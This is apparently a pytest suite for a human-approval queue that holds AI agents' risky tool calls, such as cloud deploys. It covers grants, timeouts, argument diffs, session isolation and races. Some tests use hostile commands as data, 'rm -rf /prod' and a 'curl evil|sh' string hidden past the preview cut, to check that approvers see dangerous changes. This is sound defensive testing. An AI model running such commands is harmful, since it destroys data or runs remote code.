"""Issue 3: human approval queue for require_approval decisions."""

from __future__ import annotations

import asyncio
import threading
import time


import server
from backend.approvals import InMemoryApprovalStore
from backend.events.bus import EventBus
from backend.events.models import StatusEvent

POLICY = """
version: 1
approval: {timeout_seconds: 30}
rules:
  - id: approve-cloud-deploy
    match: {tool: cloud.deploy}
    effect: require_approval
  - id: approve-quick
    match: {tool: cloud.quick}
    effect: require_approval
    approval: {timeout_seconds: 0.5}
  - id: approve-with-grant
    match: {tool: cloud.scale}
    effect: require_approval
    approval: {timeout_seconds: 30, grant_ttl_seconds: 60}
"""

DEPLOY = {"tool": {"name": "cloud.deploy"}, "arguments": {"service": "api", "version": "1.4.2", "region": "blr1"}}


def _deploy(**changes):
    body = {"tool": dict(DEPLOY["tool"]), "arguments": {**DEPLOY["arguments"], **changes}}
    return body


def _until(ws, predicate, limit=80):
    seen = []
    for _ in range(limit):
        event = ws.receive_json()
        seen.append(event)
        if predicate(event):
            return event, seen
    raise AssertionError(f"event not seen in {limit} messages: {[e.get('type') for e in seen]}")


def test_pending_then_approved_via_longpoll_and_websocket(client, policy_file):
    policy_file(POLICY)
    h = {"X-Session-Id": "ops-room"}
    with client.websocket_connect("/ws/events?session=ops-room") as ws:
        resp = client.post("/api/check", json=DEPLOY, headers=h)
        assert resp.status_code == 202, resp.json()
        body = resp.json()
        assert body["status"] == "pending"
        assert body["effect"] == "require_approval" and body["blocked"] is True
        assert body["rule_id"] == "approve-cloud-deploy"
        aid = body["approval_id"]
        assert body["poll_url"] == f"/api/approvals/{aid}"

        got: dict = {}

        def both(e):
            if e.get("type") in ("decision", "approval"):
                got[e["type"]] = e
            return len(got) == 2

        _until(ws, both)
        card, pending = got["decision"], got["approval"]
        assert card["action"] == "require_approval" and card["approval_id"] == aid
        assert pending["change"] == "pending" and pending["approval_id"] == aid
        assert pending["arguments"] == {"service": "api", "version": "1.4.2", "region": "blr1"}
        assert pending["policy_rule_id"] == "approve-cloud-deploy"

        result: dict = {}

        def long_poll():
            result["resp"] = client.get(f"{body['poll_url']}?wait=20", headers=h)

        t = threading.Thread(target=long_poll)
        started = time.time()
        t.start()
        time.sleep(0.3)
        assert "resp" not in result  # still held open
        answer = client.post(f"/api/approvals/{aid}", json={"approve": True, "note": "ship it"}, headers=h)
        assert answer.status_code == 200 and answer.json()["status"] == "approved"
        t.join(10)
        assert time.time() - started < 10
        polled = result["resp"].json()
        assert polled["status"] == "approved" and polled["note"] == "ship it"

        resolved, _ = _until(ws, lambda e: e.get("type") == "approval" and e["change"] == "approved")
        assert resolved["approval_id"] == aid and resolved["resolved_by"] == "session"

    # The identical call now goes through once (single-use grant)...
    again = client.post("/api/check", json=DEPLOY, headers=h)
    assert again.status_code == 200, again.json()
    assert again.json()["effect"] == "allow" and again.json()["approval_id"] == aid
    # ...and only once.
    third = client.post("/api/check", json=DEPLOY, headers=h)
    assert third.status_code == 202 and third.json()["approval_id"] != aid
    # A second answer to a resolved approval is refused.
    assert client.post(f"/api/approvals/{aid}", json={"approve": False}, headers=h).status_code == 409


def test_no_answer_times_out_as_denied(client, policy_file):
    policy_file(POLICY)
    h = {"X-Session-Id": "s-timeout"}
    with client.websocket_connect("/ws/events?session=s-timeout") as ws:
        body = client.post("/api/check", json={"tool": {"name": "cloud.quick"}, "arguments": {"n": 1}}, headers=h).json()
        aid = body["approval_id"]
        started = time.time()
        polled = client.get(f"/api/approvals/{aid}?wait=10", headers=h).json()
        assert time.time() - started < 5
        assert polled["status"] == "denied" and polled["reason"] == "timeout"
        denied, _ = _until(ws, lambda e: e.get("type") == "approval" and e["change"] == "denied")
        assert denied["reason"] == "timeout" and denied["approval_id"] == aid
    # Too late to approve; the call is still not allowed.
    assert client.post(f"/api/approvals/{aid}", json={"approve": True}, headers=h).status_code == 409
    retry = client.post("/api/check", json={"tool": {"name": "cloud.quick"}, "arguments": {"n": 1}}, headers=h)
    assert retry.status_code == 202 and retry.json()["approval_id"] != aid


def test_changed_argument_needs_new_approval_and_shows_diff(client, policy_file):
    policy_file(POLICY)
    h = {"X-Session-Id": "s-diff"}
    a = client.post("/api/check", json=DEPLOY, headers=h).json()
    client.post(f"/api/approvals/{a['approval_id']}", json={"approve": True}, headers=h)
    b = client.post("/api/check", json=_deploy(region="nyc3"), headers=h)
    assert b.status_code == 202
    assert b.json()["approval_id"] != a["approval_id"]
    assert b.json()["arguments_sha256"] != a["arguments_sha256"]
    info = client.get(f"/api/approvals/{b.json()['approval_id']}", headers=h).json()
    assert info["status"] == "pending"
    assert info["diff_from"] == a["approval_id"]
    assert info["diff"] == [{"path": "region", "change": "changed", "before": "blr1", "after": "nyc3"}]
    # Key order does not matter for the binding: A's grant still covers A.
    reordered = {"tool": {"name": "cloud.deploy"}, "arguments": {"region": "blr1", "version": "1.4.2", "service": "api"}}
    assert client.post("/api/check", json=reordered, headers=h).status_code == 200


def test_retry_while_pending_joins_same_approval(client, policy_file):
    policy_file(POLICY)
    h = {"X-Session-Id": "s-retry"}
    first = client.post("/api/check", json=DEPLOY, headers=h).json()
    second = client.post("/api/check", json=DEPLOY, headers=h).json()
    assert first["approval_id"] == second["approval_id"]
    assert len(client.get("/api/approvals?status=pending", headers=h).json()["approvals"]) == 1


def test_deny_then_retry_opens_new_approval(client, policy_file):
    policy_file(POLICY)
    h = {"X-Session-Id": "s-deny"}
    aid = client.post("/api/check", json=DEPLOY, headers=h).json()["approval_id"]
    r = client.post(f"/api/approvals/{aid}", json={"approve": False, "note": "not today"}, headers=h).json()
    assert r["status"] == "denied" and r["reason"] == "denied by approver"
    retry = client.post("/api/check", json=DEPLOY, headers=h)
    assert retry.status_code == 202 and retry.json()["approval_id"] != aid


def test_grant_ttl_allows_identical_calls_for_a_window(client, policy_file):
    policy_file(POLICY)
    h = {"X-Session-Id": "s-ttl"}
    call = {"tool": {"name": "cloud.scale"}, "arguments": {"replicas": 3}}
    aid = client.post("/api/check", json=call, headers=h).json()["approval_id"]
    client.post(f"/api/approvals/{aid}", json={"approve": True}, headers=h)
    for _ in range(3):
        assert client.post("/api/check", json=call, headers=h).status_code == 200
    assert client.post("/api/check", json={**call, "arguments": {"replicas": 30}}, headers=h).status_code == 202


def test_approval_bound_to_agent(client, policy_file):
    policy_file(POLICY)
    h = {"X-Session-Id": "s-agent"}
    aid = client.post("/api/check", json={**DEPLOY, "agent": {"id": "deployer"}}, headers=h).json()["approval_id"]
    client.post(f"/api/approvals/{aid}", json={"approve": True}, headers=h)
    other = client.post("/api/check", json={**DEPLOY, "agent": {"id": "intern"}}, headers=h)
    assert other.status_code == 202


def test_other_sessions_cannot_see_or_answer(client, policy_file):
    policy_file(POLICY)
    aid = client.post("/api/check", json=DEPLOY, headers={"X-Session-Id": "mine"}).json()["approval_id"]
    assert client.get(f"/api/approvals/{aid}", headers={"X-Session-Id": "theirs"}).status_code == 404
    assert client.post(f"/api/approvals/{aid}", json={"approve": True},
                       headers={"X-Session-Id": "theirs"}).status_code == 404
    assert client.get("/api/approvals/apr_nope", headers={"X-Session-Id": "mine"}).status_code == 404
    assert client.get(f"/api/approvals/{aid}", headers={"X-Session-Id": "mine"}).json()["status"] == "pending"


APP_KEY = "k" * 24
APPROVER_KEY = "z" * 24


def test_app_key_cannot_approve_its_own_call(client, policy_file, monkeypatch):
    policy_file(POLICY)
    monkeypatch.setattr(server.settings, "guardian_api_keys", f"billing={APP_KEY}")
    app_h = {"Authorization": f"Bearer {APP_KEY}"}
    aid = client.post("/api/check", json=DEPLOY, headers=app_h).json()["approval_id"]
    # The app can read its own approval...
    assert client.get(f"/api/approvals/{aid}", headers=app_h).json()["status"] == "pending"
    # ...but not answer it, and with no approver keys nobody can.
    assert client.post(f"/api/approvals/{aid}", json={"approve": True}, headers=app_h).status_code == 403

    monkeypatch.setattr(server.settings, "guardian_approver_keys", f"narsi={APPROVER_KEY}")
    assert client.post(f"/api/approvals/{aid}", json={"approve": True}, headers=app_h).status_code == 401
    ok = client.post(f"/api/approvals/{aid}", json={"approve": True},
                     headers={"Authorization": f"Bearer {APPROVER_KEY}"})
    assert ok.status_code == 200 and ok.json()["resolved_by"] == "narsi"
    assert client.post("/api/check", json=DEPLOY, headers=app_h).status_code == 200


def test_monitor_mode_does_not_queue(client, policy_file):
    policy_file(POLICY.replace("version: 1", "version: 1\nmode: monitor"))
    resp = client.post("/api/check", json=DEPLOY, headers={"X-Session-Id": "s-mon"})
    assert resp.status_code == 200
    assert resp.json()["effect"] == "require_approval" and resp.json()["enforced"] is False
    assert client.get("/api/approvals", headers={"X-Session-Id": "s-mon"}).json()["approvals"] == []


def test_too_many_pending_is_refused(client, policy_file):
    policy_file(POLICY)
    small = InMemoryApprovalStore(max_pending_per_session=2)
    small.add_listener(server._on_approval_change)
    server.app.state.approvals = small
    h = {"X-Session-Id": "s-cap"}
    codes = [client.post("/api/check", json=_deploy(version=str(i)), headers=h).status_code for i in range(3)]
    assert codes == [202, 202, 429]


def test_event_bus_is_bounded_and_drops_oldest():
    async def run():
        bus = EventBus(maxsize=3)
        q = bus.subscribe()
        for i in range(5):
            await bus.emit(StatusEvent(status="s", message=str(i)))
        return [q.get_nowait().message for _ in range(q.qsize())], bus.dropped

    messages, dropped = asyncio.run(run())
    assert messages == ["2", "3", "4"]
    assert dropped == 2


def test_approver_lists_app_session(client, policy_file, monkeypatch):
    policy_file(POLICY)
    monkeypatch.setattr(server.settings, "guardian_api_keys", f"billing={APP_KEY}")
    monkeypatch.setattr(server.settings, "guardian_approver_keys", f"narsi={APPROVER_KEY}")
    aid = client.post("/api/check", json=DEPLOY, headers={"Authorization": f"Bearer {APP_KEY}"}).json()["approval_id"]
    listed = client.get("/api/approvals?session=app:billing", headers={"Authorization": f"Bearer {APPROVER_KEY}"})
    assert [a["approval_id"] for a in listed.json()["approvals"]] == [aid]
    # Without an approver key the session parameter is ignored.
    own = client.get("/api/approvals?session=app:other", headers={"Authorization": f"Bearer {APP_KEY}"})
    assert [a["approval_id"] for a in own.json()["approvals"]] == [aid]
    assert client.get("/api/approvals?session=app:billing", headers={"X-Session-Id": "x"}).json()["approvals"] == []


def test_nan_and_lone_surrogate_arguments_do_not_break_the_queue(client, policy_file):
    """Python's JSON parser accepts NaN and lone surrogates; the queue, the
    dashboard feed and the retry must all still work."""
    policy_file(POLICY)
    h = {"X-Session-Id": "odd-args", "content-type": "application/json"}
    raw = ('{"tool": {"name": "cloud.deploy"}, "arguments": '
           '{"replicas": NaN, "max": Infinity, "label": "a\\ud800b", "\\udc00key": 1}}')
    with client.websocket_connect("/ws/events?session=odd-args") as ws:
        resp = client.post("/api/check", content=raw, headers=h)
        assert resp.status_code == 202, resp.text
        aid = resp.json()["approval_id"]
        pending, _ = _until(ws, lambda e: e.get("type") == "approval" and e["change"] == "pending")
        assert pending["arguments"]["replicas"] == "nan" and pending["arguments"]["max"] == "inf"
        assert pending["arguments"]["label"] == "a�b"
    got = client.get(f"/api/approvals/{aid}", headers=h)
    assert got.status_code == 200, got.text
    assert client.get("/api/approvals", headers=h).status_code == 200
    assert client.post(f"/api/approvals/{aid}", json={"approve": True}, headers=h).status_code == 200
    # The identical raw call hashes the same and uses the grant.
    again = client.post("/api/check", content=raw, headers=h)
    assert again.status_code == 200 and again.json()["approval_id"] == aid
    # A different lone surrogate is a different call.
    other = client.post("/api/check", content=raw.replace("\\ud800", "\\ud801"), headers=h)
    assert other.status_code == 202 and other.json()["approval_id"] != aid


def test_held_calls_cannot_grow_memory_through_long_names(client, policy_file):
    policy_file(POLICY)
    h = {"X-Session-Id": "long-names"}
    huge_agent = {**DEPLOY, "agent": {"id": "a" * 5000}}
    assert client.post("/api/check", json=huge_agent, headers=h).status_code in (400, 422)
    long_key = {"tool": DEPLOY["tool"], "arguments": {"k" * 5000: 1}}
    resp = client.post("/api/check", json=long_key, headers=h)
    assert resp.status_code == 202
    preview = client.get(f"/api/approvals/{resp.json()['approval_id']}", headers=h).json()["arguments"]
    assert all(len(path) <= 503 for path in preview)


def test_argument_labels_that_collide_do_not_hide_a_value(client, policy_file):
    """Two arguments whose preview labels come out the same (cut at 500
    characters, or a dotted key against a nested one) both reach the approver."""
    policy_file(POLICY)
    h = {"X-Session-Id": "colliding-labels"}
    args = {"x" * 500 + "_danger": "rm -rf /prod", "x" * 500 + "_safe": "hello",
            "a.b": "dotted", "a": {"b": "nested"}}
    resp = client.post("/api/check", json={"tool": DEPLOY["tool"], "arguments": args}, headers=h)
    assert resp.status_code == 202
    preview = client.get(f"/api/approvals/{resp.json()['approval_id']}", headers=h).json()["arguments"]
    values = sorted(str(v) for v in preview.values())
    assert values == ["dotted", "hello", "nested", "rm -rf /prod"]


# -- the approver sees every change, even past the preview cut -----------------

def _approve_then_change(client, h, before, after):
    a = client.post("/api/check", json={"tool": DEPLOY["tool"], "arguments": before}, headers=h).json()
    client.post(f"/api/approvals/{a['approval_id']}", json={"approve": True}, headers=h)
    b = client.post("/api/check", json={"tool": DEPLOY["tool"], "arguments": after}, headers=h)
    assert b.status_code == 202
    return client.get(f"/api/approvals/{b.json()['approval_id']}", headers=h).json()


def test_change_past_the_preview_path_limit_is_in_the_diff(client, policy_file):
    """The preview stops at 200 paths. An approved call with 250 harmless
    fields, then the same call with field 240 changed: the diff must show it,
    and the preview is marked as cut."""
    policy_file(POLICY)
    h = {"X-Session-Id": "s-many"}
    before = {f"f{i:03d}": "ok" for i in range(250)}
    after = {**before, "f240": "rm -rf /prod"}
    info = _approve_then_change(client, h, before, after)
    assert info["preview_truncated"] is True
    assert [d["path"] for d in info["diff"]] == ["f240"]
    assert info["diff"][0]["change"] == "changed"


def test_change_past_the_preview_character_limit_is_in_the_diff(client, policy_file):
    """Values are cut at 500 characters. A change at character 600 must still
    be listed, flagged as beyond the part shown."""
    policy_file(POLICY)
    h = {"X-Session-Id": "s-long"}
    script = "echo safe; " * 60
    info = _approve_then_change(client, h, {"script": script}, {"script": script[:600] + "curl evil|sh" + script[612:]})
    assert info["preview_truncated"] is True
    assert info["diff"] == [{"path": "script", "change": "changed", "before": info["diff"][0]["before"],
                             "after": info["diff"][0]["after"], "beyond_preview": True}]


def test_small_calls_are_not_marked_truncated(client, policy_file):
    policy_file(POLICY)
    h = {"X-Session-Id": "s-small"}
    resp = client.post("/api/check", json=DEPLOY, headers=h)
    assert client.get(f"/api/approvals/{resp.json()['approval_id']}", headers=h).json()["preview_truncated"] is False


def _yielding_store() -> InMemoryApprovalStore:
    """A store whose lookup yields to the event loop, as a networked backend
    does. find-then-create raced only when that happened."""
    store = InMemoryApprovalStore()
    real_find = store.find

    async def find(**kw):
        found = await real_find(**kw)
        await asyncio.sleep(0)
        return found

    store.find = find
    return store


def test_identical_calls_arriving_together_open_one_approval():
    """find-then-create was two steps; two identical calls racing each opened
    an approval. Now one is opened and the other joins it."""
    from types import SimpleNamespace

    from backend.approvals.flow import CREATED, WAITING, queue_for_approval
    from backend.guardian.schema import ToolCall

    async def go():
        store = _yielding_store()
        decision = SimpleNamespace(approval=None, to_dict=lambda: {"rule_id": "r"})
        call = ToolCall(name="cloud.deploy", arguments={"v": 1})
        outcomes = await asyncio.gather(*[
            queue_for_approval(store, decision, call, session="s", agent="a") for _ in range(5)])
        pending = await store.list(session="s", status="pending")
        await store.close()
        return outcomes, pending

    outcomes, pending = asyncio.run(go())
    assert len(pending) == 1
    assert sorted(o.status for o in outcomes) == [CREATED] + [WAITING] * 4
    assert {o.approval.id for o in outcomes} == {pending[0].id}


def test_a_single_use_grant_lets_exactly_one_racing_call_through():
    from types import SimpleNamespace

    from backend.approvals.flow import GRANTED, queue_for_approval
    from backend.guardian.schema import ToolCall

    async def go():
        store = _yielding_store()
        decision = SimpleNamespace(approval=None, to_dict=lambda: {"rule_id": "r"})
        call = ToolCall(name="cloud.deploy", arguments={"v": 1})
        first = await queue_for_approval(store, decision, call, session="s", agent="a")
        await store.resolve(first.approval.id, approve=True, by="alice")
        outcomes = await asyncio.gather(*[
            queue_for_approval(store, decision, call, session="s", agent="a") for _ in range(5)])
        pending = await store.list(session="s", status="pending")
        await store.close()
        return outcomes, pending

    outcomes, pending = asyncio.run(go())
    assert [o.status for o in outcomes].count(GRANTED) == 1
    # The other four share one new approval rather than opening four.
    assert len(pending) == 1
    assert {o.approval.id for o in outcomes if o.status != GRANTED} == {pending[0].id}
